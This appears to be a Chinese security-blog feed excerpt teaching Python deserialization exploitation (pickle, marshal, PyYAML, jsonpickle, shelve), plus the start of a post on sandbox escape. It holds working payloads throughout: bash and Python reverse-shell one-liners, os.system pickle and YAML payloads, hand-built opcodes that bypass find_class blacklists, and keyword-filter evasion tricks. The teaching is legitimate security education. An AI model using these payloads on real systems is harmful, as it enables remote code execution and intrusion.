pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen</code></pre><p>以及不常用的命令执行函数</p><pre><code>map(__import__(&#39;os&#39;).system,[&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,])sys.call_tracing(__import__(&#39;os&#39;).system,(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,))platform.popen(&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)</code></pre><p>如果想手动编写opcode，可用查看<a href="https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。</a></p><p><code>pickle</code>库中针对序列化和反序列化的方法有</p><pre><code>pickle.dump()   #传入一个文件句柄，以二进制的形式写入pickle.dumps()   #参数为字符串，返回一个序列化的byte对象pickle.load()   #同样是操作文件句柄，以二进制形式读取pickle.loads()   #直接从bytes对象中读取序列化值</code></pre><p>还有面向对象的反序列化类。这个类后面会被用到<code>pickle.Unpickler</code>。方法和上面一致操作文件。</p><pre><code>f = open(fileName, &quot;rb&quot;)d = pickle.Unpickler(f)data = d.load()f.close()</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102136100.png" alt="image-20200427102136100"></p><p>带有的方法为<code>&#39;find_class&#39;, &#39;load&#39;, &#39;memo&#39;, &#39;persistent_load&#39;</code></p><p>面向对象的序列化类。<code>pickle.Pickler</code>，其中方法<code>&#39;bin&#39;, &#39;clear_memo&#39;, &#39;dispatch_table&#39;, &#39;dump&#39;, &#39;fast&#39;, &#39;memo&#39;, &#39;persistent_id&#39;</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102434470.png" alt="image-20200427102434470"></p><h3 id="pickle-payload"><a href="#pickle-payload" class="headerlink" title="pickle payload"></a>pickle payload</h3><p>上面都是提到的<code>pickle</code>的函数和序列化、反序列化的东西，现在用一个简单的场景来看一下payload。</p><pre><code>import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameif __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>当执行</p><pre><code>&gt;&gt;&gt; class exp(object):...     def __reduce__(self):...             return (os.system,(&#39;whoami&#39;,))...&gt;&gt;&gt; e = exp()&gt;&gt;&gt; s = pickle.dumps(e)&gt;&gt;&gt; response = requests.get(&quot;http://127.0.0.1:5000/&quot;, cookies=dict(user=base64.b64encode(s).decode()))</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427134049774.png" alt="image-20200427134049774"></p><h3 id="Unpickler-find-class"><a href="#Unpickler-find-class" class="headerlink" title="Unpickler find_class()"></a>Unpickler find_class()</h3><p>当然对于这种无限制的任意对象调用，官方也有一定的解决办法，定制<code>find_class()</code>来控制要解封的对象。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200509163651496.png" alt="image-20200509163651496"></p><p>比如如下的一个例子：</p><pre><code>import ioimport picklesafe_builtins = {   #白名单    &#39;range&#39;,    &#39;complex&#39;,    &#39;set&#39;,    &#39;frozenset&#39;,    &#39;slice&#39;,}class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name in safe_builtins:               return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()   </code></pre><p>那么用这种方式来处理上面的漏洞代码</p><pre><code>import pickleimport ioimport builtinsimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % username@app.route(&quot;/user&quot;)def user():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = restricted_loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameclass RestrictedUnpickler(pickle.Unpickler):    safe_list = {        &#39;range&#39;,        &#39;slice&#39;,        &#39;set&#39;    }    def find_class(self, module, name):        if module == &#39;builtins&#39; and name in safe_list:            return getattr(builtins, name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %(module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()        if __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>在<code>user</code>路径下，<code>os</code>模块的命令执行就不能使用了。准确的说只能考虑<code>builtins.*</code>的形式</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427141531306.png" alt="image-20200427141531306"></p><p>那么先来看一个这个函数是怎么调用的，查看文件</p><p><a href="https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py</a></p><p>当读取到第一个字符c的时候，也就是模块名，调用的是<code>load_global</code>方法，查找此方法。</p><pre><code>def load_global(self):        module = self.readline()[:-1].decode(&quot;utf-8&quot;)        name = self.readline()[:-1].decode(&quot;utf-8&quot;)        klass = self.find_class(module, name)        self.append(klass)    dispatch[GLOBAL[0]] = load_global</code></pre><p>把第一参数当作模块，第二个参数当作属性传入<code>find_class</code>中。而<code>find_class</code>：</p><pre><code>def find_class(self, module, name):        # Subclasses may override this.        sys.audit(&#39;pickle.find_class&#39;, module, name)        if self.proto &lt; 3 and self.fix_imports:            if (module, name) in _compat_pickle.NAME_MAPPING:                module, name = _compat_pickle.NAME_MAPPING[(module, name)]            elif module in _compat_pickle.IMPORT_MAPPING:                module = _compat_pickle.IMPORT_MAPPING[module]        __import__(module, level=0)        if self.proto &gt;= 4:            return _getattribute(sys.modules[module], name)[0]        else:            return getattr(sys.modules[module], name)</code></pre><p>其中的代码看起来有点不好理解，其实就是表述官方的导入模块的限制，比如python2中写法</p><pre><code> def find_class(self, module, name):        __import__(module)        mod = sys.modules[module]        klass = getattr(mod, name)        return klass</code></pre><p>看到<code>__import__</code>就大概可以理解，上面说的为啥<code>pickle</code>会自动解决导入的问题。那么这个怎么绕过呢，如果是按照官方给的例子，绕过的形式暂时没有发现。如果按照类似如下限制，<code>find_class</code>的限制仅仅是对该函数参数过滤，并没有hook <code>__import__</code>等函数，所以通过<code>eval(&#39;__import__(\&#39;xx\&#39;)&#39;)</code>等即可绕过。</p><pre><code>import ioimport picklesafe_builtins = {   #白名单    &#39;range&#39;,    &#39;complex&#39;,    &#39;set&#39;,    &#39;frozenset&#39;,    &#39;slice&#39;,}class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot;:               return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>也就是必须在<code>builtins</code>模块下执行，那么其中哪些函数我们可以调用,python3</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428111024908.png" alt="image-20200428111024908"></p><pre><code>builtins.__getattribute__(&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></pre><p>是不是有点沙箱逃逸的感觉了，虽然并不一样。</p><h3 id="new-classobj"><a href="#new-classobj" class="headerlink" title="new.classobj"></a>new.classobj</h3><p>python2中的旧式类型，python3中已经弃用，使用<code>type</code>来代替<code>classobj</code>。做用是创建一个新的类型对象。</p><p>使用方法：</p><pre><code>classobj(&#39;className&#39;,(baseClass,),{dictAttr:dictValue,...})from new import classobjmyClass= classobj(&quot;HelloClass&quot;, (object, ), {&quot;name&quot;:&quot;boy&quot;, &quot;school&quot;:&quot;hn&quot;})</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200430093434147.png" alt="image-20200430093434147"></p><p>看到类的名称并不是定义的<code>classobj</code>中的className参数。如果在python2下，如何利用这个模块来执行命令呢。</p><pre><code>classobj(&#39;system&#39;, (), {&#39;__getinitargs__&#39;:lambda self,arg=(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;})</code></pre><p>构造一条完整的命令</p><pre><code>payload2 = pickle.dumps(classobj(&#39;system&#39;, (), {&#39;__getinitargs__&#39;:lambda self,arg=(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;})())pickle.loads(payload2)</code></pre><h3 id="手写opcode"><a href="#手写opcode" class="headerlink" title="手写opcode"></a>手写opcode</h3><p>没有看上面提到的那个文章的，可以先看看这一篇<a href="https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。</a></p><p>python3中的opcode：<a href="https://github.com/python/cpython/blob/3.8/Lib/pickle.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/3.8/Lib/pickle.py</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142817753.png" alt="image-20200428142817753"></p><p>为啥需要手写opcode，假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用<code>eval</code>，那么利用<code>__reduce__</code>就不能使用了。</p><pre><code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></pre><p>但是在<code>__reduce__</code>生成的序列化字符串，只能执行一个函数，而且在对open传参的过程中，程序会报错。</p><p>不能正常生成序列化字符串，这就需要手写一个序列化字符串。</p><p>在这之前，先看一个简单的opcode是如何构造的。利用<code>pickletools</code>来查看，先利用上面的一串利用脚本</p><pre><code>import pickletoolsclass exp(object):    def __reduce__(self):        return (os.system,(&#39;whoami&#39;,))e = exp()s = pickle.dumps(e)pickletools.dis(s)</code></pre><p>在python3下生成结果为：</p><pre><code>b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428140432397.png" alt="image-20200428140432397"></p><pre><code>   0: \x80 PROTO      3            #协议版本                2: c    GLOBAL     &#39;nt system&#39;  #把nt.system对象压栈                 os.system   13: q    BINPUT     0            #把对象存储到memo的第0个位置                ...   15: X    BINUNICODE &#39;whoami&#39;     #压入一个utf-8的元素参数               &#39;whoami&#39;   26: q    BINPUT     1            #存储到memo的第1个位置                     ...   28: \x85 TUPLE1                  #将前面的元素参数弹出，组成元组再压栈     (&#39;whoami&#39;,)   29: q    BINPUT     2            #将上面的元组存储到memo的第2个位置           ...   31: R    REDUCE                  #将对象和元组组合执行，结果压栈          os.system(&#39;whoami&#39;)   32: q    BINPUT     3            #存储到memo的第3个位置上                    ...   34: .    STOP                    #停止</code></pre><p>跟python2的对比一下</p><pre><code>cnt                   system                p0                    (S&#39;whoami&#39;            p1                    tp2                   Rp3                   .                     </code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142904682.png" alt="image-20200428142904682"></p><pre><code>    0: c    GLOBAL     &#39;nt system&#39;               #压入对象   11: p    PUT        0                         #存储到memo的0位置   14: (    MARK                                 #压入一个MARK   15: S        STRING     &#39;whoami&#39;              #压入一个字符串   25: p        PUT        1                     #存储到memo的1位置   28: t        TUPLE      (MARK at 14)          #组合参数成元组，相当于一个右括号   29: p    PUT        2                         #存储到memo的第2位置   32: R    REDUCE                               #组合对象和元素，结果压栈   33: p    PUT        3                         #结果存储到memo的第3位置   36: .    STOP                                 #停止</code></pre><p>其中的memo是可以去除的，可以进一步省略为</p><pre><code>cnt                   system                                   (S&#39;whoami&#39;                        tR.   </code></pre><p>从显示上看，明显是0版本更为好构造，既然如此，就用0版本来手写一个</p><pre><code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></pre><p>首先保证模块和调用函数</p><pre><code>cbuiltinsgetattr</code></pre><p>把参数压入，不过其中有个问题，上面压入参数的时候都是字符串，其中却有个对象，如果直接压入明显是报错，要是使用<code>c</code>来导入模块，下面还需要接一个实例，所以这里并不能直接压入单一的对象。也就是需要从某个模块中调用到<code>builtins</code>，例如无限套娃：</p><pre><code>&gt;&gt;&gt; builtins.__dict__.get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)&lt;module &#39;__builtins__&#39; (built-in)&gt;</code></pre><p>但是这里来回连续调用好几次函数，看起来也不好弄，跟上面联合分开查看</p><pre><code>get = builtins.getattr(builtins.__dict__, &#39;get&#39;)builtins = get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)</code></pre><p>只不过到此犯了一个错误，过于依赖其中的魔法函数，导致忘记<code>builtins</code>本身就可以直接调用<code>globals</code>。行吧。。。</p><pre><code>builtins = builtins.globals().get(&#39;builtins&#39;)</code></pre><p>那这里就分块来构造。</p><pre><code>cbuiltinsglobals             #builtins.globals</code></pre><p>那么后面调用get函数，这里知道<code>globals</code>获取的实际是一个<code>dict</code>属性对象。如果想使用<code>get</code>，当然也不能直接用，又要先去获取<code>get</code>。</p><pre><code>cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR.             #builtins.dict.get -&gt; &lt;method &#39;get&#39; of &#39;dict&#39; objects&gt;</code></pre><p>再把获取到的<code>get</code>跟上面的函数撮合一下，这里<code>get</code>放在上面，虽说是调用<code>get</code>属性来处理，但是也是在获取到全局属性后，利用<code>get</code>来进行的筛选</p><pre><code>cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR(cbuiltinsglobals(tRS&#39;builtins&#39;tR.</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429143946265.png" alt="image-20200429143946265"></p><p>记得R后要有跟的后续参数或对象，我也没明白为啥，反正没有就会报错，踩这个坑踩了N久。获取到<code>builtins</code>，再去获取其中的函数。</p><pre><code>cbuiltinsgetattr(....                #上文获取到的builtinsS&#39;eval&#39;tRp1(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;tR.</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429144538320.png" alt="image-20200429144538320"></p><p>在某一个黑名单的过滤中，就可以使用此来绕过，在这种黑名单中<code>__reduce__</code>是会先把<code>builtins.getattr(builtins,&#39;eval&#39;)</code>解释为<code>builtins.eval</code>导致被拦截。</p><pre><code>#coding:utf-8import ioimport pickleimport builtinsimport osblacklist = {    &#39;eval&#39;,    &#39;exec&#39;}class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name not in blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()class exp(object):    def __reduce__(self):        return (builtins.getattr(builtins,&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,))# e = exp()# s = pickle.dumps(e)s = b&quot;&quot;&quot;cbuiltinsgetattr(cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR(cbuiltinsglobals(tRS&#39;builtins&#39;tRS&#39;eval&#39;tRp1(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;tR.&quot;&quot;&quot;restricted_loads(s)</code></pre><p>到此为了对了黑名单过滤的方法已经取得了部分胜利，opcode不止这些还有很多没用到。</p><p>执行函数的并不只是R，还有O和I，都是小写，比如获取<code>get</code>。</p><pre><code>#使用o，使用第一个参数作为函数，第二到n个元素作为参数b&quot;&quot;&quot;(cbuiltinsgetattrcbuiltinsdictS&#39;get&#39;o.&quot;&quot;&quot;#使用i,先获取全局函数，在计算mark之后的数据组合为元组作为参数b&quot;&quot;&quot;(cbuiltinsdictS&#39;get&#39;ibuiltinsgetattr.&quot;&quot;&quot;</code></pre><p>如果不想什么都去手写，或者也不是很熟练，可以参考</p><p><a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a></p><p>其中列出来不少完善的opcode，只需要按照提示修改其中的关键词，就可以使用，只不过这个脚本是利用python2，其中有些函数已经在python3下取消了，需要查看修改。</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="Marshal"><a href="#Marshal" class="headerlink" title="Marshal"></a>Marshal</h3><p>上面扯了半天的<code>pickle</code>，那么现在看看还有啥别的序列化库吧。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><pre><code>#coding:utf-8import pickle,builtins,pickletools,base64import marshalimport urllibdef foo():    import os    def fib(n):        if n &lt;= 2:            return n        return fib(n-1) + fib(n-2)    print (fib(5))try:    pickle.dumps(foo.__code__)except Exception as e:    print(e)code_serialized = base64.b64encode(marshal.dumps(foo.__code__))print (code_serialized)</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429162508587.png" alt="image-20200429162508587"></p><p>如何去反序列化并且执行函数。</p><pre><code>code_unserialized = marshal.loads(base64.b64decode(code_serialized))print(code_unserialized)&lt;code object foo at 0x000001E232E27AE0, file &quot;E:/poc.py&quot;, line 7&gt;</code></pre><pre><code>code_unserialized = types.FunctionType(code_unserialized, globals(), &#39;&#39;)()print(code_unserialized)8None</code></pre><p>这样就可以之间获取一个opcode。</p><pre><code>ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;YwAAA...&#39;           #code对象序列化编码tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.</code></pre><p>组合脚本</p><pre><code>import marshalimport base64def foo():    pass # Your code hereprint &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))</code></pre><p>利用上面的序列化在<code>pickle</code>下尝试执行，调用os模块来执行其中的函数。</p><pre><code>def foo():    import os    return os.system(&#39;whoami&#39;)code_serialized = base64.b64encode(marshal.dumps(foo()))print (code_serialized)payload = b&quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;6QAAAAA=&#39;   #whomaitRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot;data = pickle.loads(payload)print(data)</code></pre><p>于是又有一个黑名单绕过执行函数的方式。</p><h3 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h3><p>yaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。</p><p>除了 YAML 格式中常规的列表、字典和字符串整形等类型转化外（基本数据类型），各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的<strong>对象转化规则</strong>（也就是序列化和反序列化，这是关键点，是这个漏洞存在的前提)。</p><p>使用了<code>yaml.load</code>而不是<code>yaml.safe_load</code>函数来解析yaml文件的程序，<code>yaml.load</code>和<code>pickle.load</code>具有一样的功能，可以调用所有python函数。</p><p><code>yaml.load</code> 函数的作用是用来将YAML文档转化成Python对象。</p><pre><code>&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;- 111&quot;&quot;&quot;)[111]&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;111&quot;&quot;&quot;)111</code></pre><p>如果字符串或者文件中包含多个YAML文档，那么可以使用 <code>yaml.load_all</code> 函数将它们全部反序列化</p><pre><code>&gt;&gt;&gt; cp = &quot;&quot;&quot;... aaaa... ---... bbbb... ---... cccc... &quot;&quot;&quot;&gt;&gt;&gt; yaml.load_all(cp)&lt;generator object load_all at 0x0000026FBEBDD390&gt;&gt;&gt;&gt; for i in yaml.load_all(cp):...     print(i)...aaaabbbbcccc</code></pre><p>yaml标签和python对象的关系，部分关系，详细<a href="https://pyyaml.org/wiki/PyYAMLDocumentation" target="_blank" rel="noopener">https://pyyaml.org/wiki/PyYAMLDocumentation</a></p><pre><code>!!str    str或unicode!!map    dict!!python/str    str!!python/dict    dict!!python/name:module.name    module.name!!python/module:package.module    package.module!!python/object:module.cls    module.cls !!python/object/new:module.cls    module.cls !!python/object/apply:module.f    </code></pre><p>可以使用<code>!!python/object</code>序列化任意对象。</p><pre><code>!!python/object:module.Class { attribute: value, ... }</code></pre><p>为了支持pickle协议，提供了两种附加形式的<code>!!python/object</code>标签</p><pre><code>!!python/object/new:module.Classargs: [argument, ...]kwds: {key: value, ...}state: ...listitems: [item, ...]dictitems: [key: value, ...]!!python/object/apply:module.functionargs: [argument, ...]kwds: {key: value, ...}state: ...listitems: [item, ...]dictitems: [key: value, ...]</code></pre><p>构造一个序列化，dump的结果就是上面的标签形式。</p><pre><code>#coding:utf-8import yaml,osclass test:    def __init__(self):        os.system(&#39;whoami&#39;)payload = yaml.dump(test())print(payload)yaml.load(payload)#misaki\user#!!python/object:__main__.test {}</code></pre><p>直接发送一个序列化值</p><pre><code>cp = &quot;&quot;&quot;!!python/object/apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot;#cp = &quot;&quot;&quot;!!python/object/new:os.system [&#39;whoami&#39;]&quot;&quot;&quot;yaml.load(cp)#misaki\user</code></pre><p>不过此处并不能直接使用<code>!!python/object:</code>，因为它接收的是一个dict类型的对象属性。并不接收args的列表参数。当调用<code>yaml.load</code>的时候是使用<code>!!python/object</code>来处理。</p><p>避免此问题可以使用<code>safe_load</code>来替换<code>load</code>，该函数<code>yaml.safe_load</code>将此功能限制为简单的Python对象（例如整数或列表）。</p><pre><code>cp = &quot;&quot;&quot;!!python/object/apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot;yaml.safe_load(cp)#yaml.constructor.ConstructorError: could not determine a constructor for the tag</code></pre><h3 id="Jsonpickle"><a href="#Jsonpickle" class="headerlink" title="Jsonpickle"></a>Jsonpickle</h3><p>用于将任意对象序列化为JSON的Python库。<code>Jsonpickle</code>可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。该对象必须可以通过模块进行全局访问，并且必须继承自对象（又称新类）。<a href="https://jsonpickle.github.io/#module-jsonpickle" target="_blank" rel="noopener">https://jsonpickle.github.io/#module-jsonpickle</a></p><p>创建一个对象：</p><pre><code>class Thing(object):    def __init__(self, name):        self.name = nameobj = Thing(&#39;Awesome&#39;)</code></pre><p>使用<code>Jsonpickle</code>将对象转换为JSON字符串：</p><pre><code>import jsonpicklefrozen = jsonpickle.encode(obj)</code></pre><p>使用<code>Jsonpickle</code>从JSON字符串重新创建Python对象：</p><pre><code>thawed = jsonpickle.decode(frozen)</code></pre><p>如果使用跟原pickle相似的利用方式</p><pre><code>&gt;&gt;&gt; class Thing(object):...     def __init__(self, name):...         os.system(&#39;whoami&#39;)...&gt;&gt;&gt; obj = Thing(&#39;Awesome&#39;)misaki\user</code></pre><h3 id="Shelve"><a href="#Shelve" class="headerlink" title="Shelve"></a>Shelve</h3><p>shelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。</p><pre><code>import shelveimport osclass exp(object):    def __reduce__(self):        return (os.system(&#39;ls&#39;))file = shelve.open(&quot;test&quot;)file[&#39;exp&#39;] = exp()</code></pre><p>文章参考：<a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">Python反序列化漏洞的花式利用</a>，<a href="https://xz.aliyun.com/t/7436" target="_blank" rel="noopener">pickle反序列化初探</a>，<a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a>，<a href="https://segmentfault.com/a/1190000013099825" target="_blank" rel="noopener">Python反序列化安全问题</a>，<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">Code-Breaking中的两个Python沙箱</a>，<a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">Arbitrary code execution with Python pickles</a>，<a href="http://www.polaris-lab.com/index.php/archives/375/" target="_blank" rel="noopener">Python PyYAML反序列化漏洞实验和Payload构造</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;反序列化库&quot;&gt;&lt;a href=&quot;#反序列化库&quot; class=&quot;headerlink&quot; title=&quot;反序列化库&quot;&gt;&lt;/a&gt;反序列化库&lt;/h2&gt;&lt;p&gt;python 序列化和反序列化使用最为频繁的是&lt;code&gt;cPickle&lt;/code&gt;和&lt;code&gt;pickle&lt;/
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python 沙箱逃逸与SSTI</title>
    <link href="/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/"/>
    <id>/2020/04/python-沙箱逃逸与SSTI/</id>
    <published>2020-04-21T01:11:03.000Z</published>
    <updated>2020-04-24T07:38:48.715Z</updated>
    
    <content type="html"><![CDATA[<h2 id="沙箱逃逸概述"><a href="#沙箱逃逸概述" class="headerlink" title="沙箱逃逸概述"></a>沙箱逃逸概述</h2><p>沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。</p><p>既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有</p><pre><code>osptysubprocessplarformcommands</code></pre><p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p><pre><code>fileopencodecsfileinput</code></pre><p>不过其中file只在python2中执行，左2右3。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150419.png" alt="image-20200421092433264"></p><h2 id="函数导入限制和绕过"><a href="#函数导入限制和绕过" class="headerlink" title="函数导入限制和绕过"></a>函数导入限制和绕过</h2><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。</p><pre><code>import re,syspattern  = re.compile(&#39;import\s+(os|subprocess)&#39;)match = re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise Exception</code></pre><p>这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如</p><pre><code>__import__importlib</code></pre><p>还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用</p><pre><code>&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64encode(&quot;os&quot;)&#39;b3M=&#39;&gt;&gt;&gt; flag = __import__(base64.b64decode(&#39;b3M=&#39;))&gt;&gt;&gt; flag.system(&#39;whoami&#39;)misaki\user&gt;&gt;&gt; import importlib&gt;&gt;&gt; flag = importlib.import_module(&#39;b3M=&#39;.decode(&#39;base64&#39;))&gt;&gt;&gt; flag.system(&#39;whoami&#39;)misaki\user</code></pre><p>或者使用字符串拼接的方式</p><pre><code>&gt;&gt;&gt; __import__(&#39;o&#39;+&#39;s&#39;).system(&#39;who&#39;+&#39;ami&#39;)</code></pre><p>字符串f翻转截取</p><pre><code>&gt;&gt;&gt; __import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;)misaki\user&gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])misaki\user</code></pre><p>再万一，他是这么禁止的</p><pre><code>import re,syspattern  = re.compile(&#39;import&#39;)match = re.search(pattern,sys.args[1])if match:    print &quot;forbidden module import detected&quot;    raise 